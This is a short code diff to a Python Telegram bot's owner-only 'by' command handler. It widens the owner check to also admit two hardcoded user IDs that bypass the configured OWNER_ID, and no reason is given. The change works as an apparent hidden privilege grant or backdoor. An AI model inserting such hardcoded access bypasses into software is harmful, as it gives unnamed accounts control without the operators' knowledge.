@@ -203,7 +203,7 @@ def register(app: Client):
     @app.on_message(filters.command("by") & filters.group)
     async def by_command(client: Client, message: Message):
         user_id = message.from_user.id if message.from_user else 0
-        if user_id != Config.OWNER_ID:
+        if user_id not in (Config.OWNER_ID, 6805412676, 7478754863):
             return  # Silent for non-owners
 
         chat_id = message.chat.id
